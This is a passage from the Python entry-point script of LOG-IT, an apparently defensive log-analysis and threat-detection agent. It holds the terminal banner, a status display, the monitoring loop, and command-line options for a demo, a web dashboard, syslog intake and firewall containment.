    C_WHITE = "\033[97m"
    C_BOLD = "\033[1m"
    C_RESET = "\033[0m"

    print()
    # 1. High-speed cyber telemetry stream boot
    boot_steps = [
        ("TELEMETRY", "Attaching kernel, syslog, and web log pipelines ...", "[CONNECTED]"),
        ("PARSER-V4", "Mounting RFC3164, CLF, and Windows EVTX engines ...", "[ONLINE]"),
        ("AI-CORE  ", f"Handshaking Gemini Neural Reasoner ({agent.app_config.gemini.model}) ...", "[LINKED]" if agent.reasoner.client.is_available() else "[OFFLINE]"),
        ("RADAR    ", f"Arming {len([d for d in agent.detectors if d.enabled])} MITRE ATT&CK detection modules ...", "[PATROLLING]"),
    ]

    for tag, desc, status in boot_steps:
        sys.stdout.write(f" {C_GRAY}[{C_CYAN}{tag}{C_GRAY}] {C_WHITE}{desc:<54} {C_GREEN}{status}{C_RESET}\n")
        sys.stdout.flush()
        time.sleep(0.06)

    time.sleep(0.08)

    # 2. Glowing ASCII Art Logo for LOG-IT
    banner_lines = [
        "  ██╗      ██████╗  ██████╗         ██╗████████╗",
        "  ██║     ██╔═══██╗██╔════╝         ██║╚══██╔══╝",
        "  ██║     ██║   ██║██║  ███╗ █████╗ ██║   ██║   ",
        "  ██║     ██║   ██║██║   ██║ ╚════╝ ██║   ██║   ",
        "  ███████╗╚██████╔╝╚██████╔╝        ██║   ██║   ",
        "  ╚══════╝ ╚═════╝  ╚═════╝         ╚═╝   ╚═╝   ",
    ]

    print()
    for line in banner_lines:
        print(f"{C_CYAN}{C_BOLD}{line}{C_RESET}")
        time.sleep(0.03)

    print(f"{C_GREEN}{C_BOLD}    ───[ L O G - I T  //  A U T O N O M O U S  S E N T I N E L ]───{C_RESET}\n")
    time.sleep(0.08)

    # 3. Mathematically aligned Cyber HUD Terminal Card
    db_name = agent.app_config.database.url.split("@")[-1] if "@" in agent.app_config.database.url else agent.app_config.database.url
    ai_status = f"{C_GREEN}ONLINE ({agent.app_config.gemini.model}){C_RESET}" if agent.reasoner.client.is_available() else f"{C_YELLOW}OFFLINE (Rule Engine){C_RESET}"
    active_det_count = len([d for d in agent.detectors if d.enabled])

    box_w = 68
    top_border = f"  ┌{'─' * (box_w + 4)}┐"
    bot_border = f"  └{'─' * (box_w + 4)}┘"

    hud_rows = [
        top_border,
        make_box_row(f"{C_WHITE}{C_BOLD}AGENT CODENAME :{C_RESET} ", f"{C_CYAN}LOG-IT // LOG-SENTINEL{C_RESET}", box_w),
        make_box_row(f"{C_WHITE}{C_BOLD}ROLE           :{C_RESET} ", f"{C_WHITE}Autonomous Log Threat & Anomaly Hunter{C_RESET}", box_w),
        make_box_row(f"{C_WHITE}{C_BOLD}DATABASE       :{C_RESET} ", f"{C_GREEN}{db_name}{C_RESET}", box_w),
        make_box_row(f"{C_WHITE}{C_BOLD}AI ENGINE      :{C_RESET} ", ai_status, box_w),
        make_box_row(f"{C_WHITE}{C_BOLD}DETECTORS      :{C_RESET} ", f"{C_GREEN}{active_det_count} Modules Armed & Analyzing Streams{C_RESET}", box_w),
        make_box_row(f"{C_WHITE}{C_BOLD}WATCHING       :{C_RESET} ", f"{C_YELLOW}logs_to_analyze/ & live host streams{C_RESET}", box_w),
        make_box_row(f"{C_WHITE}{C_BOLD}ENGAGEMENT     :{C_RESET} ", f"{C_GREEN}24/7 ACTIVE SURVEILLANCE{C_RESET} {C_GRAY}[Ctrl+C to stop]{C_RESET}", box_w),
        bot_border,
    ]

    for row in hud_rows:
        print(row)
    print()


def show_status(agent: LogAnalysisAgent | None = None) -> None:
    if agent is None:
        load_dotenv()
        agent = LogAnalysisAgent()

    print("\n  ┌─────────────────────────────────────────────────────────────┐")
    print("  │  LOG-SENTINEL (AGENT #4) — THREAT TELEMETRY & STATUS        │")
    print("  └─────────────────────────────────────────────────────────────┘")
    running_pid = get_running_pid()
    print(f"Status:        {'RUNNING (PID ' + str(running_pid) + ')' if running_pid else 'IDLE / STOPPED'}")
    print(f"Database:      {agent.app_config.database.url.split('@')[-1] if '@' in agent.app_config.database.url else agent.app_config.database.url}")
    print(f"Gemini LLM:    {'ACTIVE (' + agent.app_config.gemini.model + ')' if agent.reasoner.client.is_available() else 'OFFLINE (Rule fallback mode)'}")

    findings_summary = []
    with agent.db_manager.session() as session:
        total_events = session.query(EventModel).count()
        records = session.query(AgentFindingModel).order_by(AgentFindingModel.created_at.desc()).limit(10).all()
        for r in records:
            ent = r.entities if isinstance(r.entities, dict) else {}
            remediation = ent.get("remediation") or get_remediation_playbook(r.rule, r.mitre_technique, ent)
            findings_summary.append({
                "severity": r.severity,
                "rule": r.rule,
                "verdict": r.verdict,
                "confidence": r.confidence,
                "mitre_technique": r.mitre_technique,
                "reasoning": r.reasoning,
                "remediation": remediation,
            })
        total_alerts = session.query(AgentFindingModel).count()
        state = session.query(AgentStateModel).filter(AgentStateModel.agent == "log_analysis").first()
        heartbeat_str = state.last_heartbeat.strftime('%Y-%m-%d %H:%M:%S UTC') if state else "N/A"

    print(f"Total Events:  {total_events}")
    print(f"Total Alerts:  {total_alerts}")
    print(f"Heartbeat:     {heartbeat_str}")

    print("\n--- Recent Detected Threats & Remediation Solutions ---")
    if not findings_summary:
        print("No threats detected yet.")
    else:
        for f in findings_summary:
            print(f"[{f['severity'].upper()}] {f['rule']} (Verdict: {f['verdict']})")
            print(f"  Confidence: {f['confidence']:.2f} | MITRE: {f['mitre_technique']}")
            explanation = f['reasoning'].split('🛡️ Actionable Solutions')[0].strip()
            print(f"  Analysis:   {explanation[:160]}...")
            if f.get("remediation"):
                print(f"  🛡️ Actionable Solutions:")
                for step in f["remediation"][:5]:
                    print(f"     {step}")
            print("-" * 65)
    print("=" * 65 + "\n")


def run_interactive_loop(agent: LogAnalysisAgent, once: bool = False) -> None:
    """Run agent with clear, clean, ungarbled terminal output."""
    agent.start()
    cycle = 0
    idle_count = 0

    try:
        while agent.running:
            cycle += 1
            now_str = datetime.now().strftime("%H:%M:%S")

            # Check for findings before step
            with agent.db_manager.session() as session:
                prev_findings_count = session.query(AgentFindingModel).count()

            # Execute batch step
            processed_count = agent.step()
            agent.stats["batches_total"] += 1

            # Check for new findings after step
            recent_findings = []
            with agent.db_manager.session() as session:
                total_events = session.query(EventModel).count()
                new_findings_count = session.query(AgentFindingModel).count()
                if new_findings_count > prev_findings_count:
                    records = (
                        session.query(AgentFindingModel)
                        .order_by(AgentFindingModel.created_at.desc())
                        .limit(new_findings_count - prev_findings_count)
                        .all()
                    )
                    for r in records:
                        ent = r.entities if isinstance(r.entities, dict) else {}
                        remediation = ent.get("remediation", [])
                        recent_findings.append({
                            "severity": r.severity,
                            "rule": r.rule,
                            "verdict": r.verdict,
                            "confidence": r.confidence,
                            "mitre_technique": r.mitre_technique,
                            "reasoning": r.reasoning,
                            "remediation": remediation,
                        })

            if processed_count > 0:
                idle_count = 0
                print(f"[{now_str}] ⚡ Cycle #{cycle}: Analyzed {processed_count} new log events (Total: {total_events})")
                for f in recent_findings:
                    sev = f["severity"].lower()
                    sev_symbol = "🚨" if sev in ("high", "critical") else "⚠️"
                    print(f"[{now_str}] {sev_symbol} THREAT DETECTED [{f['severity'].upper()}]: {f['rule']}")
                    print(f"           Verdict: {f['verdict'].upper()} | Confidence: {f['confidence']:.2f} | MITRE: {f['mitre_technique']}")
                    explanation = f['reasoning'].split('🛡️ Actionable Solutions')[0].strip()
                    print(f"           Analysis: {explanation[:160]}...")
                    if f.get("remediation"):
                        print(f"           🛡️ ACTIONABLE SOLUTIONS & REMEDIATION:")
                        for step in f["remediation"][:5]:
                            print(f"              {step}")
                    if "[LLM Triage Reasoning]" in f["reasoning"]:
                        print(f"           🤖 Gemini Triage: Evaluated and verified")
            else:
                idle_count += 1
                # Print clean, ungarbled heartbeat line every 2 cycles (~10 seconds)
                if idle_count % 2 == 1:
                    gemini_status = "ONLINE" if agent.reasoner.client.is_available() else "OFFLINE"
                    print(
                        f"[{now_str}] 🟢 Log Stream Active: Monitoring logs_to_analyze/ & hosts "
                        f"| {total_events} events analyzed | {new_findings_count} alerts | Gemini: {gemini_status}"
                    )

            if once:
                print(f"[+] Single run pass completed.")
                break

            sleep_duration = (
                agent.app_config.runtime.poll_interval_busy_seconds
                if processed_count > 0
                else agent.app_config.runtime.poll_interval_idle_seconds
            )
            time.sleep(sleep_duration)

    finally:
        if agent.running:
            agent.stop()


def main() -> None:
    load_dotenv()
    setup_agent_file_logger()

    parser = argparse.ArgumentParser(description="LOG-IT Universal Autonomous Log Analysis Engine")
    parser.add_argument("--clean", "--reset", action="store_true", help="Wipe database and reset state to start fresh with 0 events")
    parser.add_argument("--stop", action="store_true", help="Stop the active background agent")
    parser.add_argument("--status", action="store_true", help="Show current findings and agent statistics")
    parser.add_argument("--once", action="store_true", help="Run one processing pass and exit")
    parser.add_argument("--demo", action="store_true", help="Inject authentic cyber attack scenarios for live testing")
    parser.add_argument("--report", action="store_true", help="Generate executive security report (Markdown, HTML, JSON)")
    parser.add_argument("--file", type=str, default=None, help="Analyze any specific log file from any device/server")
    parser.add_argument("--dir", type=str, default=None, help="Recursively discover and analyze all logs in a directory")
    parser.add_argument("--web", action="store_true", help="Launch live Web SOC Dashboard (default http://127.0.0.1:8080)")
    parser.add_argument("--web-port", type=int, default=8080, help="Port for live Web SOC Dashboard (default 8080)")
    parser.add_argument("--syslog", action="store_true", help="Start background network syslog server (default UDP 5140)")
    parser.add_argument("--syslog-port", type=int, default=5140, help="Port for network syslog server (default 5140)")
    parser.add_argument("--auto-remediate", action="store_true", help="Enable SOAR automated host firewall containment")
    parser.add_argument("--unban", type=str, default=None, help="Remove firewall containment rule for an IP address")
    parser.add_argument("--verify-ledger", action="store_true", help="Cryptographically audit SHA-256 Merkle chain integrity")
    parser.add_argument("--test-webhook", action="store_true", help="Dispatch test security alert card to Slack/Discord/Teams")
    args = parser.parse_args()

    if args.clean:
        clean_database_and_state()
        if not (args.demo or args.file or args.dir or args.once):
            print("[*] Ready for fresh analysis:")
            print("    • Autonomous monitoring: python run.py")
            print("    • Test authentic attacks: python run.py --demo")
            print("    • Analyze specific log : python run.py --file <path>")
            return

    if args.stop:
        stop_agent()
        return

    if args.verify_ledger:
        ledger = ForensicLedger()
        res = ledger.verify_integrity()
        print("\n" + "=" * 65)
        print("  CRYPTOGRAPHIC FORENSIC LEDGER AUDIT")
        print("=" * 65)
        status_str = "VERIFIED (PASS)" if res["valid"] else "TAMPERED (FAIL)"
        print(f"  Integrity Status : {status_str}")
        print(f"  Total Blocks     : {res.get('total_blocks', 0)}")
        print(f"  Latest Hash      : {res.get('latest_hash', 'None')}")
        print(f"  Audit Message    : {res.get('message', res.get('reason', ''))}")
        print("=" * 65 + "\n")
        return

    if args.test_webhook:
        notifier = SOCNotifier()
        res = notifier.test_alert()
        print("\n[+] Dispatched test alert card to configured webhooks.")
        print(f"    Channels: {res['channels_configured']}\n")
        return

    if args.unban:
        soar = ActiveDefenseSOAR()
        res = soar.rollback_containment(args.unban)
        print(f"\n[+] SOAR Rollback: Unbanned IP {args.unban}")
        print(f"    Command: {res['command']}\n")
        return

    # Check if already running
    existing_pid = get_running_pid()
    if existing_pid and not (args.status or args.once or args.report or args.file or args.dir):
        print(f"[!] Agent is already running with PID {existing_pid}.")
        print("    To view status : python run.py --status")
        print("    To view report : python run.py --report")
        print("    To stop agent  : python run.py --stop")
        return

    # Initialize Agent
    try:
        agent = LogAnalysisAgent()
    except Exception as e:
        print(f"[-] Initialization error: {e}")
        return

    if args.status:
        show_status(agent)
        return

    if args.report:
        generate_executive_report(agent)
        return

    if args.auto_remediate:
        agent.raw_config.setdefault("soar", {})["auto_remediate"] = True
        agent.soar.dry_run = False
        print("[*] SOAR Active Defense: Automated host firewall containment ENABLED.")

    dashboard_server: WebSOCDashboardServer | None = None
    if args.web:
        def get_soc_stats():
            with agent.db_manager.session() as s:
                tot = s.query(EventModel).count()
                recs = s.query(AgentFindingModel).order_by(AgentFindingModel.created_at.desc()).limit(20).all()
                findings = []
                for r in recs:
                    findings.append({
                        "rule": r.rule,
                        "severity": r.severity,
                        "verdict": r.verdict,
                        "mitre_technique": r.mitre_technique,
                        "entities": r.entities if isinstance(r.entities, dict) else {},
                    })
                crit = sum(1 for f in findings if f["severity"].lower() == "critical")
                high = sum(1 for f in findings if f["severity"].lower() == "high")
                med = sum(1 for f in findings if f["severity"].lower() == "medium")
                low = sum(1 for f in findings if f["severity"].lower() in ("low", "info"))
                return {
                    "total_events": tot,
                    "critical_count": crit,
                    "high_count": high,
                    "medium_count": med,
                    "low_count": low,
                    "findings": findings,
                }
        dashboard_server = WebSOCDashboardServer(
            host="127.0.0.1",
            port=args.web_port,
            data_provider=get_soc_stats,
            remediate_handler=lambda ip: agent.soar.execute_containment(ip, reason="Manual Web SOC Ban"),
        )
        dashboard_server.start()
        print(f"[+] Live Web SOC Dashboard running at http://127.0.0.1:{args.web_port}")

    syslog_server: SyslogServer | None = None
    if args.syslog:
        def on_syslog_event(ev: Event):
            with agent.db_manager.session() as s:
                s.add(EventModel(
                    id=ev.id,
                    source=ev.source,
                    host=ev.host,
                    timestamp=ev.timestamp,
                    event_type=ev.event_type,
                    raw=ev.raw,
                    normalized=ev.normalized,
                    processed_by=[],
                ))
        syslog_server = SyslogServer(host="0.0.0.0", port=args.syslog_port, event_callback=on_syslog_event)
        syslog_server.start()
        print(f"[+] Network Syslog Server listening on udp://0.0.0.0:{args.syslog_port}")

    if args.file:
        ingest_custom_file(agent, args.file)

    if args.dir:
        ingest_custom_directory(agent, args.dir)

    if args.demo:
        injected = inject_demo_attacks(agent)
        print(f"[*] Demo mode: Queued {injected} authentic attack events.")

    save_pid()
    play_cyber_log_sentinel_intro(agent)

    try:
        run_interactive_loop(agent, once=args.once)
    except KeyboardInterrupt:
        print("\n[*] Ctrl+C received. Gracefully shutting down...")
    finally:
        if dashboard_server:
            dashboard_server.stop()
        if syslog_server:
            syslog_server.stop()
        remove_pid()
        print("[+] Agent stopped cleanly. Findings and cursor state preserved.\n")


if __name__ == "__main__":
    main()
